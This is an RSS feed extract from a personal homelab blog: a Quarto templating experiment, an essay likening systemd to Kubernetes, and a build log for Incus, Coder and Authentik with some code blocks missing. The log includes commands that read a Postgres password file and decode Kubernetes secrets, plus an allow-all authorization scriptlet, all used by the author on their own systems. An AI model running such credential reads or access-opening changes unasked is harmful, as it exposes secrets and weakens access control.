  <title>Templating Engine with Quarto</title>
  <link>./playground/quarto-templates/</link>
  <description><![CDATA[ 





<p>I recently read a very good blogpost <a href="https://deadsimpletech.com/blog/notes_teaching_coding">We should rethink how we teach people to code</a>. It argues that instead of starting on something like python, it’s better to start at HTML, and introduce programming concepts via a templating engine in a static site generator.</p>
<p>I really like this idea. I already have <a href="../../talks/self-site/">a presentation/tutorial</a> about setting up your own website with Quarto.</p>
<p>But Quarto does not have a templating engine.</p>
<section id="liquidjs" class="level1">
<h1>LiquidJS</h1>
<p>So now I am trying to see if I can get LiquidJS, the templating engine that Jekyll uses, to work in Quarto. The most promising option is to execute actual javascript, which then does the templating. Although, I think it is a bit disappointed that it requires javascript.</p>
<script type="text/template">
{{ name | capitalize | prepend: "Welcome to "}}
</script>
<div id="result">

</div>
<script type="text/template">
{% assign foo = "FOO" %}
{% if foo == "FOO" %}
    Variable `foo` equals "FOO"
{% else %}
    Variable `foo` not equals "FOO"
{% endif %}
</script>
<div id="result">

</div>
</section>
<section id="ejs" class="level1">
<h1>EJS</h1>
<script>
  let people = ['geddy', 'neil', 'alex'];
  let html = ejs.render('<%= people.join(", "); %>', {people: people});
</script>

  <title>Systemd is Basically One Node Kubernetes</title>
  <link>./blog/systemk8s/</link>
  <description><![CDATA[ 





<p>Systemd, is essentially designed to replicate features of Kubernetes.</p>
<p>Kubernetes is (buzzwords incoming), a clustered, highly available, multi tenant, declarative, service manager and job scheduler. To break down what that means:</p>
<ul>
<li>Multi tenant: There can be different “users” on a Kubernetes cluster, which can be granually given access to different resources or capabilities</li>
<li>Declarative: All of the Kubernetes config, roles, users, and jobs, and can be declared as code, “yaml”.</li>
<li>Service Manager: Kubernetes can run services, specifically containers (this is important to note).</li>
<li>Job Scheduler: Users can start short or long running “jobs”</li>
<li>Clustered: Kubernetes can combine resources from more than one physical or virtual server into a cluster. It does not literally combine them, but rather it shifts around services and jobs to make more room. Some services can take direct advantage of this though, where running multiple instances of them does let you combine resources.</li>
<li>Highly Available: If any single “node” of a kubernetes cluster goes down, the services Kubernetes runs, and Kubernetes itself, stay active.</li>
</ul>
<p>Systemd is essentially trying to Kubernetes, without the clustering and highly available parts of Kubernetes. It is/has:</p>
<ul>
<li>Multi tenant: This is what polkit, and logind do. They give users the ability to run long running services, but control the resources and capabilities those users who have access to</li>
<li>Declarative: Systemd doesn’t use yaml like kubernetes, but instead it uses the ini file format — but almost everything in Systemd can be declared as an ini file.</li>
<li>Service Manager: This one is mostly self explanatory — but what’s important to note is the focus that systemd has on containers. There is support for OCI containers via <a href="https://blog.while-true-do.io/podman-quadlets/">podman quadlets</a>, but Systemd also has it’s <em>own</em> container format that it can <a href="https://github.com/systemd/systemd/issues/30239">launch rootlessly</a>, and built on top of this is <a href="https://systemd.io/PORTABLE_SERVICES/">systemd portablectl</a>, which is essentially an <a href="https://en.wikipedia.org/wiki/Application-level_virtualization">application container</a> format, similar to docker. You tell systemd to run a service with a root image of one of these containers, and it does so.</li>
<li>Job Scheduler: Timers, but it’s not a full featureset. Perhaps Systemd doesn’t care about this because people can simply run commands after they are ssh’ed in.</li>
</ul>
<p>Now, based on the assumption, I can make some (possibly incorrect) predictions about what features systemd will add next:</p>
<ul>
<li>Firewall service: Kubernetes has something akin to a firewall, but mostly this prediction is because Linux doesn’t really have a declarative firewall. <a href="https://www.ctrl.blog/entry/systemd-application-firewall.html">Systemd kinda already has something similar</a> but it’s not complete.</li>
<li>More advanced manipulation of user resource and capability constraints. It looks like there is some <a href="https://unix.stackexchange.com/questions/351466/set-a-default-resource-limit-for-all-users-with-systemd-cgroups">simple cgroup stuff</a>, but I do think we are going to eventually see Seccomp and other restrictions.</li>
<li>A “container repo” for portable/nspawn services. I think they used to have one for <a href="https://en.wikipedia.org/wiki/OS-level_virtualization">OS containers</a> for machinectl, but I can’t find it. But If they are actually trying to be Kubernetes, then I would expect to see a setup where you can have a file declaring a service, and then it pulls the container image for that service and then runs it.</li>
</ul>
<p>Now, “one node Kubernetes” probably isn’t the best choice for a normal server or desktop distro. (Actually I love Kubernetes as a server but that’s a different discussion). But it’s the most popular choice, so I think people should be aware of the architecture and intent behind the software they use.</p>

  <title>Build Server 6 — An easier HCI?</title>
  <link>./projects/build-server-6/</link>
  <description><![CDATA[ 





<section id="the-what" class="level1">
<h1>The What</h1>
<p>I want a whole “cloud” for myself and people around me. The services I want to host are:</p>
<ul>
<li>Authentik — Single Sign On and centralized accounts</li>
<li>Incus — to provide VPS’s to people</li>
<li>Coder — for remote development environments, but also Kali/Linux containers accessible via the browser</li>
<li>Forgejo — Code forge, with CI/CD</li>
<li>Nextcloud — a “cloud” with file sync, editing, and the like
<ul>
<li>I am also considering alternatives, like OpenCloud or Cryptpad for the features I may want from nextcloud</li>
</ul></li>
<li>Element Server Suite — A complete discord alternative</li>
<li>Something for Large Language Models
<ul>
<li>Preferably with history per OIDC user</li>
<li>Probably: <a href="https://artifacthub.io/packages/helm/open-webui/open-webui" class="uri">https://artifacthub.io/packages/helm/open-webui/open-webui</a>, <a href="https://github.com/open-webui/open-webui/issues/483">see also</a></li>
</ul></li>
</ul>
</section>
<section id="the-why" class="level1">
<h1>The Why</h1>
<p>In my <a href="../build-server-5/">previous project</a>, I attempted to deploy <a href="https://en.wikipedia.org/wiki/OpenStack">Openstack</a> entirely with <a href="https://en.wikipedia.org/wiki/DevOps#GitOps">GitOps</a> methodologies, using <a href="https://fluxcd.io/">FluxCD</a>.</p>
<p>I failed. Well, it didn’t fail, but I think I’ve spent too long on it and I need to move on.</p>
<p>Recently, I’ve discovered a project that simultaneously seems to be a distribution of OpenStack, Kubernetes, and Linux, called <a href="https://www.starlingx.io/">StarlingX</a>.</p>
<p>Also:</p>
<blockquote class="blockquote">
<p><a href="https://docs.starlingx.io/system_configuration/index-sysconf-d511820651f0.html#starlingx-openstack">StarlingX OpenStack is installed and managed as an FluxCD application.</a></p>
</blockquote>
<p>Now, StarlingX, sadly, is not GitOps OpenStack. Configurations to the OpenStack application are done via the command line, or via helm value files. Perhaps I can clone the flux repo they use, but truthfully, I’m not going to worry about it for now.</p>
</section>
<section id="starlingx-attempt" class="level1">
<h1>StarlingX Attempt</h1>
<p>There are multiple deployment guides, but I am interested in the <a href="https://docs.starlingx.io/r/stx.10.0/deploy_install_guides/release/bare_metal/aio_simplex_install_kubernetes.html">“Simplex”</a> install, which documents how to do an All in One install, using a single server, which is all I have.</p>
<p>I also care a lot about “For OpenStack only: Configure data interfaces for controller-0. Data class interfaces are vSwitch interfaces used by vSwitch to provide VM virtio vNIC connectivity to OpenStack Neutron Tenant Networks on the underlying assigned Data Network.”, since I only have one physical interface in use, and the other one will be virtual.</p>
<p>I started by obtaining an ISO, and attempting to install it in a virtual machine. The installer crashed becasue it wanted 500 GB of storage… which is fair I guess.At least it doesn’t crash because I don’t have enough CPU cores or ram.</p>
<p>Just kidding. It doesn’t boot. I don’t know why. Instead it stays stuck on “booting on hard disk”. This probably would work better on a physical machine, but I want to make sure it works on a virtual machine first.</p>
<p>But I install it on my physical server anyways. It doesn’t get an ip address via dhcp.</p>
<p>I understand why people like turnkey solutions, like ESXI now.</p>
<p>I look into another HCI solution: <a href="https://docs.harvesterhci.io/">Suse Harvester</a>. It’s actually a very good software, the UI is great and the install is easy. But if you want any kind of authorization and control over who can see what projects, you have to deploy rancher, which can then “consume” the harvester api and work with it. While excellent, I don’t really feel like having to set up rancher either on another server, or in a virtual machine.</p>
<p>In addition to that, I could not figure out how networking works, and how to set up a bridged network. I did deploy a virtual machine, although at first I accidentally gave it 1000 Gi of ram and it would not run because my machine does not have 1000 Gi of ram.</p>
<p><img src="./projects/build-server-6/images/allocate.jpg" class="img-fluid"></p>
<p>Also, I did find something funny though:</p>
<p><img src="./projects/build-server-6/images/editor.jpg" class="img-fluid"></p>
<p>But at this point, I was done, and I began looking into something else, <a href="https://linuxcontainers.org/incus/docs/main/">Incus</a>.</p>
<p>Incus:</p>
<ul>
<li>Can be installed on top of another distro</li>
<li>Has networking I understand, “simply” bridging</li>
<li>Has <a href="https://linuxcontainers.org/incus/docs/main/authorization/#tls-authorization">authorization and authentication</a> by restricting TLS certs to a project
<ul>
<li>Not the complex SSO I want, but I need <em>something</em> working</li>
</ul></li>
</ul>
<p>Incus also has some nice features, like it can access a <a href="https://images.linuxcontainers.org/">repository</a> of LXC images (similar to Dockerhub), which is cool for testing out many different Linux distros.</p>
<p>Anyway, I did actually attempt to deploy it using Debian backports.</p>
<pre><code>root@b718c16e3b2d:/etc/apt/sources.list.d# apt install incus

Some packages could not be installed. This may mean that you have

The following information may help to resolve the situation:

<p>Disappointing.</p>
<p>Instead, I followed the instructions on the <a href="https://github.com/zabbly/incus">github</a>… mostly.</p>

</div>
<p>And changed “managed” to true instead of false.</p>
<p>Once I do this, I use cockpit to convert the main network interface into a bridge that also a ethernet interface.</p>
<p>So I got incus working. In a new/incognito tab, you can go to <code>/ui/login</code>, and follow the instructions to set up the UI.</p>
<p>I attempt to set up an Alpine instance, with the network attatched directly to my ethernet/bridge combo. Yeah, that was a bad idea, as it took my network offline.</p>
<p>Instead, I decided to create a veth, and then attatch that to my bridge (openstack style… ugh. I can’t believe I’m doing this again).</p>
<p><code>nmcli con add type veth ifname veth1 con-name veth1 veth.peer eth1</code></p>
<p>And then add the <code>veth1</code> as a port to the <code>eth0</code> bridge.</p>
<p>And then after that:</p>
<p><code>incus network create public0 bridge.external_interfaces=eth1 ipv4.address=none ipv4.dhcp=false ipv6.address=none ipv6.dhcp=false</code></p>
<p>This essentially creates a public network with no dns and dhcp. Instead, vitual machines will get their required address via dhcp — and they do!</p>
<p>But I realize something: I have two ethernet ports available to me, but I am only using one of them. I should use either a bond or a team to combine them into one, and then convert <em>that</em> merged interface into a bridge that also acts as an ethernet port.</p>
<p>Based on <a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-comparison_of_network_teaming_to_bonding#sec-Comparison_of_Network_Teaming_to_Bonding">this comparison chart</a>, it looks like Teaming is better.</p>

<p>It looks like my upload and download is capped at 100 Mbit/s. Let’s see if we can double that.</p>
<p>Okay, but it looks like <a href="https://www.redhat.com/en/blog/if-you-bonding-you-will-love-teaming">teaming has been deprecated</a> — but in Red Hat, or in general? My Debian system still seems to be able to set up teaming.</p>
<p>Okay, but now that I know I want bonding, <a href="https://www.kernel.org/doc/Documentation/networking/bonding.txt">which mode do I want</a>? Some modes seem to require configuration on the switch, which rules them out, but I want best performance from the modes I can use.</p>
<p>Testing time!</p>
<p>I did two kinds of tests: one with <code>speedtest</code>, and another with <code>speedtest &amp; speedtest &amp; speedtest</code>, to see if more in parallel would have different results.</p>
<p>Better than would it would be alone, but it still seems bad.</p>

<p>I notice that the first packet seems to have a lot less information, and then it’s the stuff after that that usually hits near 100 mbit/s in speed.</p>
<p>(I also ran a quick check with iperf to make sure that both interfaces actually worked, which they did, they both worked and got 70 mbit/s of bandwidth.).</p>
<p>Round robin works by just rotating which interface gets the next packet. According to the internet, it can result in packets arriving out of order, which can lead to slower speeds than a single nic in some cases. I can’t find any posts on this that are newer than 3 years old, so I don’t know if it applies, but I wanted to avoid round robin for that reason.</p>
<p>People say the best mode is LACP, but I don’t get any performance improvement — however, according to <a href="https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/configuring_and_managing_networking/configuring-network-bonding_configuring-and-managing-networking#configuring-a-network-bond-by-using-nmcli_configuring-network-bonding">Red Hat’s documentation</a>, this mode does seem to require some configuration on the side of the network switch. Perhaps without that configuration can still <em>do</em> a bond and combine two interfaces into one, but you don’t get any performance out of it?</p>
<p>But when I run iperf on each of the physical interfaces simeuataneously, perhaps there is some kind of cap? Maybe the “two” ethernet interfaces in the wall are actually only one? But then why does round robin have consistent, better performance, over the theoretical 100 mbit/s limit?</p>
<p>I think it is the former issue:</p>

<p>Much of the information has been ommitted for brevity, but it seems that if your switch doesn’t support/isn’t configured, then the “Aggregator ID” will be different when it’s supposed to be the same, meaning only one ethernet interface is actually getting used.</p>
<p>Instead of LACP, I set up loadbalancer-alb and use <code>ifstat</code> to moniter network traffic:</p>

<p>Nice! When running two <code>iperf</code> tests at once, to two different servers, both are used at once, and I get double the network traffic! Both iperf tests report 80 mbit/s.</p>
<p>Then, I convert this bond to a bridge using cockpit. And the process of attempting to do so, the machine goes offline. It’s possible that you cannot convert a bond to the special bridge that also acts as a normal ethernet at the same time, or maybe you cannot use a bond as a bridge at all.</p>
<p>No, it does work. It’s just that the address was reasigned via dhcp, but I wasn’t sshing into the right port (I use port 22022 rather than the default 22).</p>
<p>And then: <code>nmcli con add type veth ifname veth1 con-name veth1 veth.peer eth1</code></p>
<p>And then disable both from cockpit, but add veth1 as a port to the main bridge.</p>
<p>Then, eth1 can be used as a bridge for incus.</p>
<p><code>incus network create public0 bridge.external_interfaces=eth1 ipv4.address=none ipv4.dhcp=false ipv6.address=none ipv6.dhcp=false</code></p>
<p>And then it works.</p>
<p>It’s brought up to me by a friend, that there is a possibility that the limitation of speeds is not on my side, either the NIC or the cable, but instead on CSUN’s side, a 100 mbit/s limitation per <em>mac address</em>.</p>
<p>I test this by running three speedtests simultaneously, two on the side of CSUN’s internet, and one within a virtual machine that has it’s own Mac address. But the test only gets 200 mbit/s total from every device.</p>
<p>However, there is a real possibility I am using the wrong cables, and it’s the cables that are limiting. I will test</p>

<h1>Incus Configuration</h1>
<p>Firstly, I don’t want the “default” profile. It forces the <code>incusbr0</code> network on virtual machines, whereas I want users to be able to select an for which network they want — either a public network or an internal network.</p>
<p>A big thing I want is for the layer8 project to have it’s own seperate set of networks and firewall rules, but still be able to have access to the <code>public0</code> network I have created, so people can create public virtual machines.</p>

<p>There is no network named internal0 — instead I add one in after I create the project. With this, they would be limited to a single internal network, and public network.</p>
<section id="authorization-certscriptlet" class="level2">
<h2 class="anchored" data-anchor-id="authorization-certscriptlet">Authorization — Cert/Scriptlet</h2>
<p><code>incus config trust add-certificate --projects layer8 --restricted layer8.crt</code></p>
<p><code>incus config trust add --projects layer8 --restricted layer8.crt</code></p>
<p>And with this, my instance is restricted.</p>
<p>Mostly. Storage pools and storage doesn’t seem to work at all.</p>
<p>So I create another storage pool called “layer8” from the UI. But this fails, and doesn’t seem to be accessible from the layer8 project.</p>
<p>I play around with it more, but I think what I need to do is write an “authorization scriptlet” that explicitly gives access for the layer8 storage pool to those users.</p>
<p>The language used in these “scriptlets” is Starlark… which is not documented on the actual <a href="https://linuxcontainers.org/incus/docs/main/authorization/#authorization-scriptlet">authorization scriptlet</a> section. Thankfully, there is another <a href="https://linuxcontainers.org/incus/docs/main/explanation/clustering/#instance-placement-scriptlet">instance placement scriptlet</a>, which talks about the language and parameters taken, and how to actually use and set the scriptlet.</p>
<p>Of course, this is still pretty unclear. What is an object? <a href="https://github.com/lxc/incus/blob/main/doc/rest-api.yaml">Incus has auto generated api documentation</a>, including on what I am assuming is an “object”, <a href="https://github.com/lxc/incus/blob/main/doc/rest-api.yaml#L6295">StoragePools</a>.</p>
<p>So I need a scriptlet that allows the Layer 8 Certificate, to access storage pool objects named</p>
<p>If if I have to do this anyways, what was the point of trying to avoid the openid + openfga (I would have to write code) setup?!</p>
<p>So here is my attempt at a scriplet that allows all access:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>allowall.star</strong></pre>
</div>
<div class="sourceCode" id="cb9" data-filename="allowall.star" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><span class="kw" style="color: #003B4F;

</div>
<p><code>cat allowall.star | incus config set authorization.scriptlet=-</code></p>
<p>And it works! The Layer 8 Certificate can get access to all resources.</p>

<p>Okay. And now nothing has access to anything. It seems that these scriptlets happen <em>before</em> the authorizations happen, and not after. Meaning that you have to actually write scriptlets to do something</p>

<p>After this I do some testing, and it mostly works — except the Layer 8 certificate has access to the <code>default</code> storage pool, including being able to upload isos, which is not what I want. But, if I remove the <code>can_view_resources</code> bit, then the Layer 8 Certificate cannot see the disk space used in that storage pool — which I may not want.</p>
<p>I also may need to give access to the objects <code>"profile:layer8/default"</code>, since that seems to exist in the <code>default</code> project.</p>
<p>So I asked on the creators youtube stream, if there is any way to associate a storage pool to a project, for a restricted certificate.</p>
<p>He says that you can set a limit of 0 for the disk space of a storage pool, for a project, and then that project won’t be able to access that storage pool. I don’t like this solution, as I want my authorization logic to be deny by default, and explicitly allow access to certain resources. However, it does give me an idea:</p>
<p>What if I deny access to storage pools not named layer8? Well, I would first have to filter for an object, a string that starts with “storage_pool:”</p>

<p>This still doesn’t restrict the Layer 8 certificate from uploading to the default storage pool. Actually now, Incus seems to crash/freeze, and I have to restart the systemd service in order to get back.</p>
<p>Okay. At this point, attempting to upload an ISO crashes Incus (testing with the allow all log script). The API won’t load, and the command line just hangs as well. Systemd logs don’t say anything, so I’m stuck. I can restart Incus, but this changes testing my authorization scriptlets from annoying to painful.</p>
<p>I’m going to update the website this, and make a post in the Incus forum.</p>
<p>Post: <a href="https://discuss.linuxcontainers.org/t/authorization-scriptlet-how-to-allow-a-restricted-certificate-to-access-a-single-storage-pool/23497/2" class="uri">https://discuss.linuxcontainers.org/t/authorization-scriptlet-how-to-allow-a-restricted-certificate-to-access-a-single-storage-pool/23497/2</a></p>
<p>But I need a solution now, pretty much.</p>

<p>Next up is the rest of the services I want to host. I still want to do a Kubernetes cluster, with everything GitOps though, but having Incus opens up another oppurtunity: I could do a multi node Kubernetes cluster, in virtual machines, instead of a single node.</p>
<p>I know I still want SSO, and I actually want SSO for Incus as well. After watching looking at openfga, it doesn’t seem to be nightmarishly hard. I think I will do a one node kubernetes cluster, again with openebs, reusing that same flux config. But this time, the deployment will be done in a virtual machine, where I can snapshot the entire virtual machine, feed it the gpu, or the extra hard drive I have. ’</p>
<p>Nah. I think I’m just gonna deploy bare metal.</p>
<p>Disable RKE2 ingress-nginx:</p>

<h2 class="anchored" data-anchor-id="coder">Coder</h2>
<p><a href="https://coder.com/">coder</a> is an open source platform for remote desktop environments. The thing they seem to be most excited about is the VScode based environemnts, but I care the most about the terminal access, and the webvnc based environments.</p>
<p>Also, looking at their <a href="https://github.com/coder/coder/blob/main/helm/coder/values.yaml">helm chart values</a>, and their <a href="https://coder.com/docs/admin/users/oidc-auth">OIDC documentation</a> it seems that environment variables are used to configure many aspects of coder.</p>
<p>So, I need to set up secrets again.</p>
<p><code>sops --encrypt --encrypted-regex '^(values.yaml)$' codersecrets.yaml</code></p>
<p>To get secret content after it is applied, for testing:</p>
<p><code>kubectl get secret secret -n namespace -o jsonpath="{.data.values\.yaml}" | base64 -d</code></p>
<p>One hiccup: I fear taht I may need to set a list of valid email domains that it accepts as OIDC users, <a href="https://coder.com/docs/admin/users/oidc-auth#step-2-configure-coder-with-the-openid-connect-credentials">documented here</a>.</p>
<p>But looking <a href="https://github.com/coder/coder/blob/4587082fcf84a92bda6413733371373acae2392f/coderd/userauth.go#L1357">through the code</a>, it looks like I can leave that config empty.</p>
<p>So here are my two secrets, that I am encrypting (without the sensitive data, of course):</p>

<p><code>sops --encrypt --encrypted-regex '^(values.yaml)$' --in-place filename.yaml</code></p>
<p>Whoops, this doesn’t deploy.</p>
<p><code>kubectl create namespace coder</code></p>
<p>It mostly worked, but I encountered an error:</p>
<pre><code>Encountered an error running "coder server", see "coder server --help" for more information
error: access-url must include a scheme (e.g. 'http://' or 'https://)</code></pre>
<p>So I had to change that variable.</p>
<p>One thing I decided to do is store the terraform configuration files in my git repo. They won’t be applied automatically,</p>
<p>But eventually, I got it deployed. I even set up a workspace, using the starter “kubernetes” template.</p>
<p>It doesn’t come with noVNC, which I really want. I’m looking at adapting the code from the <a href="https://github.com/bpmct/coder-templates/blob/main/desktop-container/main.tf">desktop container</a> in combination with <a href="https://docs.linuxserver.io/images/docker-kali-linux/">the Kali Linux webtop image</a> to get a web based Kali Linux environmet for CTF’s, workshops, and similar events.</p>
<p>Okay, this is actually kinda difficult.</p>
<p><code>s6-overlay-suexec: fatal: can only run as pid 1</code></p>
<p>So the webtop docker containers work by launching a complex set of init scripts using s6, and if I try to start s6 via the <code>/init</code> script in a shell, then it complains about not being pid one. I might have to create a custom container to get around this, but I don’t want to do that.</p>
<p>Another thing I can try is creating a <a href="https://github.com/linuxserver/docker-mods?tab=readme-ov-file#creating-and-maintaining-a-docker-mod">“docker mod”</a>, an extension to Linuxserver’s docker containers that can be called via an environment variable. <a href="https://docs.linuxserver.io/images/docker-webtop/#native-apps">Usage example here</a></p>
<p>I could also try the <a href="https://hub.docker.com/r/codercom/enterprise-desktop/tags">enterprise-desktop</a> image by Coder themselves, but I really do want that kasmvnc and kali image.</p>
<p>Although, it looks like I don’t have time, since I need an emphermal desktop UI up now, for the lab. The <a href="https://github.com/bpmct/coder-templates/blob/main/better-vnc/main.tf">coder templates repo has a “better vnc” image</a>, which is a kasmvnc based image. But, there is no prebuild docker image for me to work with. I tried to replace the <a href="https://github.com/bpmct/coder-templates/blob/main/better-vnc/build/Dockerfile">Dockerfile</a> image with kasmweb’s docker image: <code>docker.io/kasmweb/kali-rolling-desktop:1.17.0</code>. But it didn’t work.</p>
<p>Instead, I built that image, and pushed it to <a href="https://hub.docker.com/r/moonpiedumplings/coder/tags">docker hub</a>.</p>
<p>I play around with the image, and the terraform code, but when I try to deploy it, I get an error. It’s unclear, but I think the problem is that the kasmweb images I used, is designed for docker, so when I try to deploy it on kubernetes, things break.</p>
<p>What about something else: With the Linuxserver images, what if I run a second command in the container. It looks like kubernetes can do this via <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/">container lifecycle hooks</a>. I can also reuse these in the <a href="https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/deployment#nestedblock--spec--template--spec--container--l">terraform</a>.</p>
<p>This seemed interesting, and after some tinkering with security contexts (I think s6 init wants to start as root), I almost have it working but code-server has an error:</p>
<p><code>/tmp/code-server/bin/code-server: exec: line 28: /tmp/code-server/lib/code-server-4.8.3/lib/node: not found</code></p>
<p>Sometimes the persistent volume claim that Coder would createw ould fail to delete, becuse the container wasn’t getting deleted. To fix, I had to shell into the container, and then <code>pkill coder</code>, to destroy the zombie process.</p>
<p>But, after using the normal code-server install script, which installs a debian package into the system it works. But, after much tinkering, I’ve found that I don’t actually need code-server right now, so I got rid of it.</p>
<p>The important thing is the coder agent. This agent seems to not properly die, which somewhat makes sense, because I start it via a <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/#container-hooks">container lifecycle poststart hook</a> having it be an actual command.</p>
<p>The problem is that even though the container dies properly if I exec in and kill the coder process (or PID 1), it doesn’t work if I have these commands as a lifecycle hook.</p>
<p>I also discovered that “coder.agent.main.startup_script” and “coder.agent.main.init_script” are different. Init script is what downloads and starts the actual coder agent, whereas the startup script is just auxilliary stuff you want to run, like downloading and starting code-server.</p>
<p>So I need a way to start the init script, such that it detatches and disowns itself and then the kubernetes contanier considers itself as running. After some tinkering, I got this:</p>
<p><code>command = ["screen", "-dmS", "coder_screen", "sh", "-c", coder_agent.main.init_script]</code></p>
<p>Because the container comes with screen already, I can do this, and reuse an existing container for coder with minimal modifications or changes to the terraform overall (other options I were looking into were things like using a volume mount to add more s6 services, but it is difficult because the init_script is autogenerated, so I don’t actaully know what it is, and I also still do not know if it is a shell script or just a sequence of commands set up by EOF).</p>
<p>In the future, when I have more users, another thing I want to do is apply NetworkPolicies depending on the groups a user is, to control which networks that the workspace has access to.</p>
<p>I have made a <a href="https://gist.github.com/moonpiedumplings/641be9c7662fa10174fe9845a183c073">Github Gist</a> with my code.</p>
<p>Next up is to inject the environment variables via secrets.</p>
<p>It took some tinkering but I got it working in the repo. Apparently, the postgres process doesn’t actually need the secret url I gave it, so I got rid of it.</p>
<p>Also, apparently when coder does a release upgrade, it deletes all it’s data, and asks for a new admin account. Since I want to auto update coder, I wonder if I can GitOps the entire configuration?</p>
<section id="oauth2" class="level3">
<h3 class="anchored" data-anchor-id="oauth2">Oauth2</h3>
<p>Another thing is that Oauth2/OIDC was not working. It seems that my method of secrets did not work, so instead I have to do something else, “envfrom”.</p>
<p><a href="https://artifacthub.io/packages/helm/coder-v2/coder" class="uri">https://artifacthub.io/packages/helm/coder-v2/coder</a></p>
<p><a href="https://github.com/coder/coder/blob/main/helm/coder/values.yaml#L31" class="uri">https://github.com/coder/coder/blob/main/helm/coder/values.yaml#L31</a></p>
<p>In addition to this, I also set CODER_PG_CONNECTION_URL. It seems that I wasn’t setting that, which caused me to lose all user data upon upgrades.</p>
<p>But after this, I attempted to get OIDC role sync working. But it doesn’t work, as it seems that it’s a premium feature. And in addition to that, I cannot control what permissions OIDC users have from the UI, so I have to authenticate as the admin user from the command line, and then I can use <code>coder user edit-roles moonpiedumplings</code></p>
</section>
</section>
<section id="authentik" class="level2">
<h2 class="anchored" data-anchor-id="authentik">Authentik</h2>
<p>It’s deployed (see <a href="../build-server-5/">previous project</a>), but I am going to record my steps here. Firstly, it looks like I should configure from the “Application” page, and use “Create with Provider” in order to create the whole set of necessary things.</p>
<p>There were some interesting hiccups though. The “Issuer url” for Coder should have a backslash, it seems to use strict string matching.</p>
<pre><code>error: create oidc config: configure oidc provider: oidc: issuer did not match the issuer returned by provider, expected "https://sso.moonpiedumpl.ing/application/o/coder" got "https://sso.moonpiedumpl.ing/application/o/coder/"</code></pre>
<p>Also, for Incus, it looks like I need to enable <a href="https://docs.goauthentik.io/docs/add-secure-apps/providers/oauth2/device_code">device code</a>, otherwise it won’t work.</p>
<p>I’m now stuck for Incus, because it seems that single sign on only works if the services are on the same domain/subdomain. Incus is on a different domain, so it fails. I need to proxy a service external to Kubernetes, to something inside Kubernetes.</p>
<p>This is actually more difficult than I thought it would be.</p>

<p>So this works, but it doesn’t get an SSL certificate. It just uses the default kubernetes test certificate, rather than a real one. To fix this, you have to remove these two annotations:</p>
<pre><code>acme.cert-manager.io/http01-edit-in-place: "true"
nginx.ingress.kubernetes.io/backend-protocol: "HTTPS"</code></pre>
<p>Before readding them. But don’t letsencrypt only last 90 days? But this works, however.</p>
<p>Next thing is, I want to automatically create projects in Incus when users are invited, so people can have a private (publicly hosted) VPS for whatever they want.</p>
<p>Right now, the most reasonable way to do this is to do a “stage” with an “expression policy”, which can execute arbitrary python code, and then I can make a API call with the python request library (using my private admin certificate).</p>
<p><a href="https://linuxcontainers.org/incus/docs/main/rest-api-spec/#/projects/projects_post">Here are the Incus API docs on how to add a project</a>. <a href="https://docs.goauthentik.io/docs/customize/policies/working_with_policies#bind-a-policy-to-a-stage">Here are the docs on how to bind an expression policy to a stage</a>.</p>
<p>Okay apparently requests needs to read a certificate file in order to do TLS auth, and I don’t have one. I can probably get around this by creating a tempfile or something of the sort.</p>
<p>I may also need to make a python request to openfga… hmmm. I think this might be too complex. Firstly, let’s figure out what actually needs to be done:</p>
<ul>
<li>User does invite</li>
<li>Create incus project named after user (via api call, that passes uses a tls certificate to authenticate)</li>
<li>Add user to created project in openfga. I think this is giving a user either the operator or user relation to a project.</li>
</ul>
<p>According to one of the <a href="https://github.com/lxc/incus/blob/1f61d85b164cdfd33600e7ce3b13154feea54de5/test/suites/openfga.sh#L273">test suites</a>, it looks like the “user” of a project can interact with instances, but not edit them, whereas an <a href="https://github.com/lxc/incus/blob/1f61d85b164cdfd33600e7ce3b13154feea54de5/test/suites/openfga.sh#L185">operator has control over project level resources</a> (but maybe is restricted by project restrictions.)</p>

<p>I will have to collect some information, on the authorization model id, and the store id.</p>
<p>Okay, I won’t sweat a custom project yet. But I will automatically add invited users to the layer8 group.</p>
<p>Creating an invite was pretty painful. There appear to be steps required, but not documented on the <a href="https://docs.goauthentik.io/docs/users-sources/user/invitations">invitation documentation page</a>, where you also have to bind an “invitation” stage as the first stage in the actual invite flow. Otherwise things don’t work.</p>
<p>But after some tinkering, and giving up on an expression policy that affects both Incus and openfga, and focusing on openfga instead, I got something that works:</p>

<p>With this, users can sign up, and then they automatically get added as a “member” to the openfga object. Then they can log in via SSO to incus, and they have access to the layer8 project.</p>
<p>People have complimented me, saying that this setup is much, much easier to use than the previous setup, in which people had to import certificates.</p>
<section id="postgres-update" class="level3">
<h3 class="anchored" data-anchor-id="postgres-update">Postgres update</h3>
<p>So my authentik goes down, because I need to manually backup and restore the postgres database in order for an update to happen.</p>
<p><a href="https://version-2023-10.goauthentik.io/docs/troubleshooting/postgres/upgrade_kubernetes" class="uri">https://version-2023-10.goauthentik.io/docs/troubleshooting/postgres/upgrade_kubernetes</a></p>
<p>Except, since postgres updated automatically, it was crashing because it couldn’t launch with oldder database files. Firstly, I edited the pod and downgraded postgres.</p>
<p>But I got an ImagePullBackOff error, so I firstly <a href="https://kubernetes.io/docs/tasks/access-application-cluster/list-all-running-container-images/">listed all images running in the cluster</a>, before seleccting the postgres image that was already there.</p>
<p>I have to get the secret myself:</p>
<p><code>cat /opt/bitnami/postgresql/secrets/postgres-password</code></p>
<p>It still says password authentication failed, but it does dump the file out.</p>
<p>I end with <code>mv data data-15</code>.</p>
<pre><code>[moonpie@osiris ~]$ flux resume source git flux-system
[moonpie@osiris ~]$ flux reconcile helmrelease -n authentik authentik</code></pre>
<p>But then I still can’t do things because I’m not root.</p>
<pre><code> resources: {}
    securityContext:
      allowPrivilegeEscalation: true
      capabilities:
        drop:
        - ALL
      privileged: false
      readOnlyRootFilesystem: true
      # runAsGroup: 1001
      runAsNonRoot: false
      # runAsUser: 1001</code></pre>
<p>So I edit the pod with that. Doesn’t work, apparently only a few things can be changed.</p>
<p>I follow <a href="">this stackoverflow answer</a>, and come up with this:</p>
